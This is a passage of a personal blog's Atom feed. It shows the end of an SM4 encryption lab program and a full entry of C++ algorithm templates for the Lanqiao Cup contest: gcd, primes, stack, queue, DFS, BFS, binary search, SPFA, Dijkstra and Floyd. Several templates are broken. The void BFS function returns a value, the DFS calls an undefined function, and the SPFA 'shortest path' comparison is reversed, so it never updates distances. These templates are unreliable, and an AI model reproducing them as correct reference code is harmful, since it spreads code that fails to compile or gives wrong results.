class="hljs-number">4</span>;i++)<br>        cout&lt;&lt;out1[i]&lt;&lt;<span class="hljs-string">" "</span>;<br>    cout&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">"解密结果:"</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">sm4</span>(out1,rk);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>        cout&lt;&lt;out2[i]&lt;&lt;<span class="hljs-string">" "</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;DES&quot;&gt;&lt;a href=&quot;#DES&quot; class=&quot;headerlink&quot; title=&quot;DES&quot;&gt;&lt;/a&gt;DES&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p</summary>
      
    
    
    
    
    <category term="密码学实验代码集合" scheme="https://kylinxin.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81%E9%9B%86%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>蓝桥杯</title>
    <link href="https://kylinxin.github.io/2023/04/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>https://kylinxin.github.io/2023/04/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2023-04-09T15:14:29.000Z</published>
    <updated>2023-09-13T07:24:34.518Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="救赎"><a href="#救赎" class="headerlink" title="救赎"></a>救赎</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-欧几里得辗转相除法-求解-最大公约数-最小公倍数"><a href="#1-欧几里得辗转相除法-求解-最大公约数-最小公倍数" class="headerlink" title="1.欧几里得辗转相除法 求解 最大公约数 最小公倍数"></a>1.欧几里得辗转相除法 求解 最大公约数 最小公倍数</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span>{<span class="hljs-keyword">return</span> b == <span class="hljs-number">0</span> ? a : <span class="hljs-built_in">gcd</span>(b, a % b);}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lcm</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span>{<span class="hljs-keyword">return</span> a / <span class="hljs-built_in">gcd</span>(a, b) * b;}<br></code></pre></td></tr></tbody></table></figure><h3 id="2-求质数"><a href="#2-求质数" class="headerlink" title="2.求质数"></a>2.求质数</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 判断素数 */</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPrime</span><span class="hljs-params">(LL n)</span> </span>{<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i * i &lt;= n; ++i)<br><span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3.栈"></a>3.栈</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br>stack&lt;类型&gt; mystack;<br>s.<span class="hljs-built_in">empty</span>();         <span class="hljs-comment">//如果栈为空则返回true, 否则返回false;</span><br>s.<span class="hljs-built_in">size</span>();          <span class="hljs-comment">//返回栈中元素的个数</span><br>s.<span class="hljs-built_in">top</span>();           <span class="hljs-comment">//返回栈顶元素, 但不删除该元素</span><br>s.<span class="hljs-built_in">pop</span>();           <span class="hljs-comment">//弹出栈顶元素, 但不返回其值</span><br>s.<span class="hljs-built_in">push</span>();          <span class="hljs-comment">//将元素压入栈顶</span><br></code></pre></td></tr></tbody></table></figure><h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4.队列"></a>4.队列</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br>queue&lt;类型&gt; myqueue;<br><span class="hljs-built_in">push</span>() <span class="hljs-comment">//在队尾插入一个元素</span><br><span class="hljs-built_in">pop</span>() <span class="hljs-comment">//删除队列第一个元素</span><br><span class="hljs-built_in">size</span>() <span class="hljs-comment">//返回队列中元素个数</span><br><span class="hljs-built_in">empty</span>() <span class="hljs-comment">//如果队列空则返回true</span><br><span class="hljs-built_in">front</span>() <span class="hljs-comment">//返回队列中的第一个元素</span><br><span class="hljs-built_in">back</span>() <span class="hljs-comment">//返回队列中最后一个元素</span><br></code></pre></td></tr></tbody></table></figure><h3 id="5-DFS-深度优先"><a href="#5-DFS-深度优先" class="headerlink" title="5.DFS(深度优先)"></a>5.DFS(深度优先)</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = {<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>};<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>};<br><span class="hljs-type">int</span> mp[N][N];<span class="hljs-comment">//存放迷宫</span><br><span class="hljs-type">int</span> vis[N][N];<span class="hljs-comment">//表示是否访问过，初始为flase</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DFS</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span><span class="hljs-comment">//x,y是坐标点的位置 </span></span><br><span class="hljs-function"></span>{<br><span class="hljs-keyword">if</span>(vis[x][y] || (x==n &amp;&amp; y==n)) <span class="hljs-keyword">return</span>; <span class="hljs-comment">//表示已经访问过了或者到达终点,递归的出口</span><br>vis[x][y] = <span class="hljs-literal">true</span>; <span class="hljs-comment">//表示没有访问过，现在正在访问，置为访问过</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++){<span class="hljs-comment">//遍历四个方向，顺序依次是，上下左右</span><br><span class="hljs-type">int</span> nx = x + dx[i];<br><span class="hljs-type">int</span> ny = y + dy[i];<br>      <span class="hljs-comment">//进行了合法性检验，</span><br>      <span class="hljs-comment">//1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n</span><br>      <span class="hljs-comment">//2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续</span><br>      <span class="hljs-comment">//3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续</span><br><span class="hljs-keyword">if</span>(nx &gt; <span class="hljs-number">0</span> &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; <span class="hljs-number">0</span> &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == <span class="hljs-string">'0'</span>)<br><span class="hljs-built_in">dfs</span>(nx,ny);<br>} <br>}<br><span class="hljs-comment">//注意!! 应该判断一下起点是否可走</span><br></code></pre></td></tr></tbody></table></figure><h3 id="6-BFS-广度优先搜索"><a href="#6-BFS-广度优先搜索" class="headerlink" title="6.BFS(广度优先搜索)"></a>6.BFS(广度优先搜索)</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> X[<span class="hljs-number">4</span>]={<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1</span>};<br><span class="hljs-type">int</span> Y[<span class="hljs-number">4</span>]={<span class="hljs-number">-1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>};<br><span class="hljs-type">int</span> matrix[N][N]; <span class="hljs-comment">//存储迷宫信息</span><br><span class="hljs-type">int</span> vis[N][N];<span class="hljs-comment">//存储每个状态点是否走过</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span>{<br><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span> y;<br>}Node, top;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> xx, <span class="hljs-type">int</span> yy)</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-keyword">if</span>(xx&lt;<span class="hljs-number">0</span>||yy&lt;<span class="hljs-number">0</span>||xx&gt;=N||yy&gt;=N) <span class="hljs-comment">//注意边界</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span>(vis[xx][yy]==<span class="hljs-literal">true</span>||matrix[xx][yy]==<span class="hljs-number">0</span>)<span class="hljs-comment">//下一个点走过或者为墙 0不能走，1能走</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BFS</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>{<br>queue&lt;node&gt; q;<br>Node.x=x;<br>Node.y=y;<br>q.<span class="hljs-built_in">push</span>(Node);<span class="hljs-comment">//将起点入队列</span><br><span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<span class="hljs-comment">//队列不空就扩散</span><br>{<br>top=q.<span class="hljs-built_in">front</span>();<span class="hljs-comment">//取出队首元素</span><br><span class="hljs-type">int</span> nx=top.x;<br><span class="hljs-type">int</span> ny=top.y;<span class="hljs-comment">//从四个方面机进行扩散</span><br>         <span class="hljs-keyword">if</span>(nx == ex &amp;&amp; ny == ey) <span class="hljs-comment">//找到终点</span><br>             <span class="hljs-keyword">return</span> top;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; i++)<br>{<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">judge</span>(nx+X[i], ny+Y[i])) <span class="hljs-comment">//检查四个方向，如果有路就进队列</span><br>{<br>Node.x=nx+X[i];<br>Node.y=ny+Y[i];<br>q.<span class="hljs-built_in">push</span>(Node);<br>}<br>}<br>ans++;<span class="hljs-comment">//计数器</span><br>vis[nx][ny]=<span class="hljs-literal">true</span>;<br>q.<span class="hljs-built_in">pop</span>();<span class="hljs-comment">//表示这个点的邻接点已经全部入队列，丢弃这个点</span><br>}<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="7-二分模板"><a href="#7-二分模板" class="headerlink" title="7.二分模板"></a>7.二分模板</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    作者:FengBOOOOOOOOOOOOOOO</span><br><span class="hljs-comment">    二分模板返回大于x的第一个位置    </span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 1005</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> a[N],n,q;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> key)</span><span class="hljs-comment">//l为-1，r为数组长度</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">while</span>(l + <span class="hljs-number">1</span> &lt; r)<br>    {<br>        <span class="hljs-type">int</span> mid = l + r&gt;&gt;<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(a[mid] &lt;= key)<br>        　　l = mid;<br>        <span class="hljs-keyword">else</span><br>        　　r = mid;<br>    }<br>    <span class="hljs-keyword">return</span> r;<span class="hljs-comment">//返回大于Key的第一个位置</span><br>}<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">int</span> k;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d%d"</span>,&amp;n,&amp;q);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i)<br>    　　<span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>,&amp;a[i]);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; q; ++i)<br>    {<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>,&amp;k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,<span class="hljs-built_in">find</span>(<span class="hljs-number">-1</span>,n,k));<br>    }<br>} <br><br></code></pre></td></tr></tbody></table></figure><h2 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h2><h3 id="1-SPFA最短路径-类似与BFS"><a href="#1-SPFA最短路径-类似与BFS" class="headerlink" title="1.SPFA最短路径(类似与BFS)"></a>1.SPFA最短路径(类似与BFS)</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inf 0x3f3f3f3f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pii pair<span class="hljs-string">&lt;int, int&gt;</span></span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod = <span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">2e5</span>+<span class="hljs-number">7</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span> {<span class="hljs-type">int</span> to,w,next;} edge[maxn];<br><span class="hljs-type">int</span> head[maxn], cnt;<br><span class="hljs-type">int</span> dis[maxn], vis[maxn];<br><span class="hljs-type">int</span> n, m, s, t;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Spfa</span><br>{<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-built_in">memset</span>(head,<span class="hljs-number">-1</span>,<span class="hljs-built_in">sizeof</span>(head));<br>        <span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">0x3f3f3f3f</span>,<span class="hljs-built_in">sizeof</span>(dis));<br>        <span class="hljs-built_in">memset</span>(vis,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(vis));<br>        cnt = <span class="hljs-number">0</span>;<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> u,<span class="hljs-type">int</span> v,<span class="hljs-type">int</span> w)</span></span><br><span class="hljs-function">    </span>{<br>        edge[cnt].to = v;<br>        edge[cnt].w = w;<br>        edge[cnt].next = head[u];<br>        head[u] = cnt ++;<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>{<br>        dis[s] = <span class="hljs-number">0</span>; vis[s] = <span class="hljs-number">1</span>;<br>        queue &lt;<span class="hljs-type">int</span>&gt; Q; Q.<span class="hljs-built_in">push</span>(s);<br>        <span class="hljs-keyword">while</span>(!Q.<span class="hljs-built_in">empty</span>())<br>        {<br>            <span class="hljs-type">int</span> now = Q.<span class="hljs-built_in">front</span>();<br>            Q.<span class="hljs-built_in">pop</span>(); vis[now] = <span class="hljs-number">0</span>;    <span class="hljs-comment">//从队列中弹出now , vis[now] 标记为未访问</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = head[now]; i != <span class="hljs-number">-1</span>; i = edge[i].next)<br>            {<br>                <span class="hljs-type">int</span> v = edge[i].to;<br>                <span class="hljs-keyword">if</span>(dis[v] &lt; dis[now] + edge[i].w)<br>                {<br>                    dis[v] = dis[now] + edge[i].w;<br>                    <span class="hljs-keyword">if</span>(vis[v]) <span class="hljs-keyword">continue</span>;    <span class="hljs-comment">//如果访问过了(也就是 已经在队列中),就不用再push</span><br>                    vis[v] = <span class="hljs-number">1</span>; Q.<span class="hljs-built_in">push</span>(v);<br>                }<br>            }<br>        }<br>    }<br>}sp;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">while</span>(~<span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d%d"</span>,&amp;n,&amp;m) &amp;&amp; n+m)<br>    {<br>        sp.<span class="hljs-built_in">init</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>        {<br>            <span class="hljs-type">int</span> u, v, w;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d%d%d"</span>,&amp;u, &amp;v, &amp;w);<br>            sp.<span class="hljs-built_in">add</span>(u, v, w);<br>            sp.<span class="hljs-built_in">add</span>(v, u, w);<br>        }<br>        s = <span class="hljs-number">1</span>, t = n; <span class="hljs-comment">//s起点，t终点</span><br>        sp.<span class="hljs-built_in">spfa</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, dis[t]);<br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure><h3 id="2-Dijkstra"><a href="#2-Dijkstra" class="headerlink" title="2.Dijkstra"></a>2.Dijkstra</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//主要思想一个大循环+两个小循环</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span>{<br><span class="hljs-type">int</span> u, minx;<br>book[S] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++){<br><span class="hljs-comment">//dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]</span><br>dist[i] = v[S][i];<br>}<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++){<span class="hljs-comment">//大循环</span><br>minx = INT_MAX;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; N; j++){<span class="hljs-comment">//寻找没有被标记并且最短的路径，并记录此结点 </span><br><span class="hljs-keyword">if</span>(!book[j] &amp;&amp; minx &gt; dist[j]){<br>minx = dist[j];<br>u = j;<br>} <br>}<br>book[u] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; N; k++){<br><span class="hljs-comment">//如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据</span><br><span class="hljs-keyword">if</span>(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){<br>dist[k] = dist[u]+v[u][k];<br>}<br>}<br>}<br>}<br><br></code></pre></td></tr></tbody></table></figure><h3 id="3-Floyd"><a href="#3-Floyd" class="headerlink" title="3.Floyd"></a>3.Floyd</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//初始化：</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (i == j) d[i][j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span> d[i][j] = INF;<br><br><span class="hljs-comment">// 算法结束后，d[a][b]表示a到b的最短距离</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">floyd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>                d[i][j] = <span class="hljs-built_in">min</span>(d[i][j], d[i][k] + d[k][j]);<br>}<br><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&quot;救赎&quot;&gt;&lt;a href=&quot;#救赎&quot; class=&quot;headerlink&quot; title=&quot;救赎&quot;&gt;&lt;/a&gt;救赎&lt;/h1&gt;&lt;h2 id=&quot;基础知识&quot;&gt;</summary>
      
    
    
    
    
    <category term="蓝桥杯刷题总结" scheme="https://kylinxin.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
